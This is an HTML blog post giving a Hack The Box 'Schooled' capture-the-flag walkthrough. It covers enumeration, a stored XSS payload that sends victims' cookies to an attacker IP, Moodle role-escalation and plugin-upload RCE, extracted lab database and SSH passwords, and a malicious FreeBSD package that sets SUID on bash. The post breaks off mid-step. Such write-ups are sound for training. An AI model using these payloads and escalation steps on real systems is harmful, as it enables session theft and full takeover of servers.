<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Schooled" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/schooled/" /><meta property="og:url" content="https://x00tex.github.io/posts/schooled/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/schooled/schooled_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-26T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/schooled/schooled_banner.png" /><meta property="twitter:title" content="Hackthebox - Schooled" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-16T12:39:32+00:00","datePublished":"2021-05-26T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - Schooled","image":"https://x00tex.github.io/assets/img/posts/schooled/schooled_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/schooled/"},"url":"https://x00tex.github.io/posts/schooled/"}</script><title>Hackthebox - Schooled | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Schooled</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Schooled</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1622053800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-05-26 </em> </span> <span> Updated <em class="timeago" data-ts="1652704772" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1321 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/schooled/schooled_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="enumeration">Enumeration</h1><p><strong>IP-ADDR:</strong> 10.10.10.234 schooled.htb</p><p><strong>nmap scan:</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc <span class="o">(</span>RSA<span class="o">)</span>
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http    Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 <span class="o">(</span>FreeBSD<span class="o">)</span> PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message<span class="s2">"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"</span>
|     HY000
|   oracle-tns: 
|     Invalid message-frame.<span class="s2">"
|_    HY000
1 service unrecognized despite returning data.

Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
</span></pre></table></code></div></div><ul><li><strong>mysqlx is mysql + X Plugin</strong><li>musqlx overview <a href="https://mysqlserverteam.com/mysql-5-7-12-part-3-more-than-just-sql/">blog</a><li>Python module <a href="https://github.com/mysql/mysql-connector-python">mysql-connector-python</a> for intract with mysqlx: <code class="language-plaintext highlighter-rouge">pip install mysql-connector-python</code><li><strong><a href="https://dev.mysql.com/doc/refman/5.7/en/x-plugin.html">X Plugin</a></strong> allows MySQL to function as a document store. X Plugin enables MySQL Server to communicate with clients using <strong><a href="https://dev.mysql.com/doc/internals/en/x-protocol.html">X Protocol</a></strong>, which is a prerequisite for using MySQL as a document store. Clients that communicate with a MySQL Server using X Protocol can use <strong><a href="https://dev.mysql.com/doc/x-devapi-userguide/en/">X DevAPI</a></strong> to develop applications. X DevAPI offers a modern programming(javascript, python) interface with a simple yet powerful design which provides support for established industry standard concepts. <strong><a href="https://dev.mysql.com/doc/mysql-port-reference/en/mysql-ports-reference-tables.html">mysql port</a></strong> for X Protocol (mysqlx_port), supported by clients such as MySQL Shell, MySQL Connectors and MySQL Router, is calculated by multiplying the port used for classic MySQL protocol. if the classic MySQL protocol port is the default value of 3306 then the X Protocol port is 33060.<li>http server is Running static web app</ul><p><strong>ffuf scan</strong> found a subdomain</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>❯ ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ <span class="nt">-H</span> <span class="s1">'Host: FUZZ.schooled.htb'</span> <span class="nt">-u</span> http://schooled.htb/ <span class="nt">-ac</span> <span class="nt">-c</span> <span class="nt">-v</span>

... <span class="o">[</span>snip] ...
________________________________________________

<span class="o">[</span>Status: 200, Size: 84, Words: 5, Lines: 2]
| URL | http://schooled.htb/
    <span class="k">*</span> FUZZ: moodle
</pre></table></code></div></div><h1 id="foothold">Foothold</h1><h2 id="moodle-lms-enumeration"><span class="mr-2">Moodle LMS Enumeration</span><a href="#moodle-lms-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">moodle.schooled.htb</code> running a LMS(Learning Management System) Application</p><p><img data-src="/assets/img/posts/schooled/moodle-page.png" alt="" data-proofer-ignore></p><p><strong><a href="https://moodle.org/">Moodle</a></strong> is a free and open-source learning management system written in PHP and distributed under the GNU General Public License.</p><p>using <a href="https://github.com/droope/droopescan">droopescan</a> tool to scan moodle cms</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>❯ droopescan scan moodle <span class="nt">-u</span> http://moodle.schooled.htb/moodle/
<span class="o">[</span>+] Plugins found:                                                              
    forum http://moodle.schooled.htb/moodle/mod/forum/
        http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
        http://moodle.schooled.htb/moodle/mod/forum/version.php

<span class="o">[</span>+] No themes found.

<span class="o">[</span>+] Possible version<span class="o">(</span>s<span class="o">)</span>:
    3.10.0-beta

<span class="o">[</span>+] Possible interesting urls found:
    Static readme file. - http://moodle.schooled.htb/moodle/README.txt
    Admin panel - http://moodle.schooled.htb/moodle/login/
</pre></table></code></div></div><p>Running version <strong><code class="language-plaintext highlighter-rouge">3.10.0-beta</code>(?)</strong></p><p>from login page <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/login/</code> get “create new account” option but when trying to create new account, get email address error.</p><p><img data-src="/assets/img/posts/schooled/newac-email.png" alt="" data-proofer-ignore></p><p>than create student account with email <code class="language-plaintext highlighter-rouge">&lt;username&gt;@student.schooled.htb</code></p><p>Don’t find anything interesting from student account.</p><h3 id="version-identifing"><span class="mr-2">version identifing</span><a href="#version-identifing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>droopescan found version <code class="language-plaintext highlighter-rouge">3.10.0-beta</code> but if we compare <code class="language-plaintext highlighter-rouge">/mod/forum/upgrade.txt</code> changelogs with original <a href="https://github.com/moodle/moodle/blob/v3.10.0-beta/mod/forum/upgrade.txt">v3.10.0-beta</a> from <a href="https://github.com/moodle/moodle">github repo</a> there is something missing</p><p><img data-src="/assets/img/posts/schooled/version-compare1.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/img/posts/schooled/version-compare2.png" alt="" data-proofer-ignore></p><p>Running version on the sever is potentially <strong><code class="language-plaintext highlighter-rouge">&gt;=3.9.0-beta</code> to <code class="language-plaintext highlighter-rouge">&lt;=3.9.2</code></strong></p><p>we can cross check this by comparing <code class="language-plaintext highlighter-rouge">md5sum</code> hash from server and github’s <code class="language-plaintext highlighter-rouge">upgrade.txt</code> file.</p><p><img data-src="/assets/img/posts/schooled/md5-compare.png" alt="" data-proofer-ignore></p><p>md5sum hash is equal with version <code class="language-plaintext highlighter-rouge">3.9.2</code> and <code class="language-plaintext highlighter-rouge">upgrade.txt</code> Latest commit <code class="language-plaintext highlighter-rouge">d21d6ba on Oct 17, 2019</code> in version <code class="language-plaintext highlighter-rouge">3.9.0-beta</code> and still same until <code class="language-plaintext highlighter-rouge">3.9.3</code></p><h3 id="vulnerability"><span class="mr-2">vulnerability</span><a href="#vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>found vulnerability list from <a href="https://snyk.io/vuln/composer:moodle%2Fmoodle">snyk vulnerability database</a></p><p><img data-src="/assets/img/posts/schooled/moolde-snyk.png" alt="" data-proofer-ignore></p><p>There are 2 vulnerabilities looks interesting</p><p><a href="https://snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-1049535">XSS</a>: Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The <code class="language-plaintext highlighter-rouge">moodlenetprofile</code> user profile field required extra sanitizing to prevent a stored XSS risk.</p><p><a href="https://snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-1048845">Privilege Escalation</a>: Affected versions of this package are vulnerable to Privilege Escalation. Users with “Log in as” capability in a course context (typically, course managers) may gain access to some site administration capabilities by “logging in as” a System manager.</p><p><strong>XSS</strong> can be exploited from user and <strong>Privilege Escalation</strong> give access to admin panel from manager role and we already know the manager “Lianne Carter”.</p><p><img data-src="/assets/img/posts/schooled/school-manager.png" alt="" data-proofer-ignore></p><h2 id="xss-in-moodle"><span class="mr-2">XSS in “Moodle”</span><a href="#xss-in-moodle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25627">CVE-2020-25627</a>: <code class="language-plaintext highlighter-rouge">moodlenetprofile</code> field in user profile is vulnerable for xss. which found <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/user/edit.php</code> after creating student account.</p><p><img data-src="/assets/img/posts/schooled/moodlenet-field.png" alt="" data-proofer-ignore></p><p><strong>Payload</strong></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="k">new</span> <span class="nx">Image</span><span class="p">;</span><span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://10.10.15.71:8000/?</span><span class="dl">"</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>save payload in <code class="language-plaintext highlighter-rouge">moodlenetprofile</code> field and wait.</p><p><img data-src="/assets/img/posts/schooled/xss-exploited.png" alt="" data-proofer-ignore></p><p>this happened because xss payload saved in user profile and when other user visit to that user’s profile script executed on there browser.</p><p>From mathematics Lecturer “Manuel Phillips” course Announcements <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/mod/forum/discuss.php?d=5</code>: “For students who wish to attend my lectures be sure that you have your MoodleNet profile set.” when user enroll in his course, <strong>teacher review that student profile</strong>.</p><p>So when “Manuel Phillips” visit our profile, xss payload get executed in his browser and we get his session cookie.</p><p><img data-src="/assets/img/posts/schooled/become-math-teacher.png" alt="" data-proofer-ignore></p><h2 id="privilege-escalation-in-moodle"><span class="mr-2">Privilege Escalation in “Moodle”</span><a href="#privilege-escalation-in-moodle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>PoC from <a href="https://github.com/HoangKien1020/CVE-2020-14321">HoangKien1020@github</a></p><h3 id="from-teacher-to-manager-role"><span class="mr-2">From teacher to manager role</span><a href="#from-teacher-to-manager-role" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><strong><a href="https://moodle.org/mod/forum/discuss.php?d=407393">CVE-2020-14321</a>:</strong> Teachers of a course were able to assign themselves the manager role within that course.</p><p><em>Hackbar is not working properly for me so i setup brup rule for replacing cookie</em></p><p><em>And also, we can use cookie editor but knowing multiple solutions for a problem could be useful in some situation.</em></p><p>First setup scope limited to <code class="language-plaintext highlighter-rouge">schooled.htb</code> host so brup only granted only scoped host request.</p><p><img data-src="/assets/img/posts/schooled/burp-set-scope.png" alt="" data-proofer-ignore></p><p>than setup “match and replace” rule to replace cookie value.</p><p><img data-src="/assets/img/posts/schooled/burp-set-rule1.png" alt="" data-proofer-ignore></p><p>add same rule for both headers</p><p><img data-src="/assets/img/posts/schooled/burp-set-rule2.png" alt="" data-proofer-ignore></p><p><strong>Continue</strong></p><p>When teacher “Manuel Phillips” add Participants in his course. There is a option to assign role for the Participant only inside that course. if we as “Manuel Phillips” intercept that request and change role id to <code class="language-plaintext highlighter-rouge">1</code>, that Participant become a manager inside the course. That way we add “Manuel Phillips” in manager role inside the course by changing userID with roleID.</p><p><strong>First,</strong> Go to course Participants tab and enrol users.</p><p><img data-src="/assets/img/posts/schooled/manager-privesc1.png" alt="" data-proofer-ignore></p><p><strong>Second,</strong> Intercept enrolled request and replace <code class="language-plaintext highlighter-rouge">userlist%5B%5D=24</code> and <code class="language-plaintext highlighter-rouge">roletoassign=1</code> and forward the request.</p><p><img data-src="/assets/img/posts/schooled/manager-privesc2.png" alt="" data-proofer-ignore></p><p>And “Manuel Phillips” got manager role.</p><p><img data-src="/assets/img/posts/schooled/manager-privesc3.png" alt="" data-proofer-ignore></p><p><strong>Third,</strong> Now we need to add original manager “Lianne Carter” in the Participants.</p><p>Currently we are as manager role inside the course, that means we can login as any user from Participants list and if we add “Lianne Carter” in the Participants we can login as “Lianne Carter” and “Lianne Carter” have manager role over full website.</p><p>So Assign user “Lianne Carter” in the course</p><p><img data-src="/assets/img/posts/schooled/manager-privesc4.png" alt="" data-proofer-ignore></p><p>And now going to “Lianne Carter” profile from course Participants as “Manuel Phillips”, we can see a new option “Log in as”</p><p><img data-src="/assets/img/posts/schooled/manager-privesc6.png" alt="" data-proofer-ignore></p><p>Click login as and continue</p><p><img data-src="/assets/img/posts/schooled/manager-privesc7.png" alt="" data-proofer-ignore></p><p>And we are logged in as “Lianne Carter”</p><p><img data-src="/assets/img/posts/schooled/manager-privesc5.png" alt="" data-proofer-ignore></p><h3 id="from-manager-to-admin-role"><span class="mr-2">From manager to admin role</span><a href="#from-manager-to-admin-role" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25629">CVE-2020-25629</a>:</strong> Users with “Log in as” capability in a course context (typically, course managers) may gain access to some site administration capabilities by “logging in as” a System manager.</p><p><img data-src="/assets/img/posts/schooled/admin-privesc1.png" alt="" data-proofer-ignore></p><p>inside “Define roles” select manage and edit.</p><p><img data-src="/assets/img/posts/schooled/admin-privesc2.png" alt="" data-proofer-ignore></p><p>inside “edit” click on “save changes” and intercept that request and replace post data with <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>’s payload and forward.</p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Forget to take screenshot</ul><p>after that we can see extra option in “plugins”</p><p><img data-src="/assets/img/posts/schooled/admin-rce1.png" alt="" data-proofer-ignore></p><h2 id="moodle-admin-rce"><span class="mr-2">Moodle Admin RCE</span><a href="#moodle-admin-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>click on “install plugins” than “Install plugin from ZIP file” and upload <code class="language-plaintext highlighter-rouge">rce.zip</code> get from <a href="https://github.com/HoangKien1020/CVE-2020-14321">PoC</a></p><p><img data-src="/assets/img/posts/schooled/admin-rce2.png" alt="" data-proofer-ignore></p><p>Click install than continue and after that go to <code class="language-plaintext highlighter-rouge">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id</code> <em>plugin deletes after few minute</em></p><p><img data-src="/assets/img/posts/schooled/admin-rce3.png" alt="" data-proofer-ignore></p><h1 id="privesc">Privesc</h1><p>After some manual enumeration found moodle directory and get the db creds from config.php file</p><p><img data-src="/assets/img/posts/schooled/db-creds.png" alt="" data-proofer-ignore></p><p>login to mysql and get “admin” password hash</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/local/bin/mysql <span class="nt">-u</span> moodle <span class="nt">-pPlaybookMaster2020</span> <span class="nt">-D</span> moodle <span class="nt">-e</span> <span class="s2">"SELECT username,password FROM mdl_user WHERE username='admin'"</span>
</pre></table></code></div></div><p><img data-src="/assets/img/posts/schooled/hash-cracked.png" alt="" data-proofer-ignore></p><h2 id="pkg-with-sudo"><span class="mr-2"><code class="language-plaintext highlighter-rouge"><span class="mr-2">pkg</code> with sudo</span><a href="#pkg-with-sudo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are 2 users on the box</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>jamie:<span class="k">*</span>:1001:1001:Jamie:/home/jamie:/bin/sh
steve:<span class="k">*</span>:1002:1002:User &amp;:/home/steve:/bin/csh
</pre></table></code></div></div><p>Cracked hash worked for user “jamie” on ssh login.</p><p>User “jamie” have sudo right to run <code class="language-plaintext highlighter-rouge">/usr/sbin/pkg</code> as any user on the box with NOPASSWD.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg <span class="nb">install</span> <span class="k">*</span>
</pre></table></code></div></div><p>user “jamie” can install any freebsd package with sudo.</p><p>found exploit from <a href="https://gtfobins.github.io/gtfobins/pkg/">gtfobins</a>, *this is same as <code class="language-plaintext highlighter-rouge">sudo snap</code> on armageddon box.</p><p>Create milicious package from fpm.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">COMMAND</span><span class="o">=</span><span class="s1">'chmod +s /bin/bash'</span>
<span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$COMMAND</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/x.sh
fpm <span class="nt">-n</span> x <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> freebsd <span class="nt">-a</span> all <span class="nt">--before-install</span> <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
</pre></table></code></div></div><p>If <code class="language-plaintext highlighter-rouge">fpm</code> is not install</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>gem <span class="nb">install</span> <span class="nt">--no-document</span> fpm
<span class="nb">sudo </span>apt-get <span class="nb">install </span>squashfs-tools
</pre></table></code></div></div><p>upload package with scp</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sshpass <span class="nt">-p</span> <span class="s1">'!QAZ2wsx'</span> scp ./x-1.0.txz jamie@schooled.htb:/home/jamie/pkg
</pre></table></code></div></div><p>And finally run</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
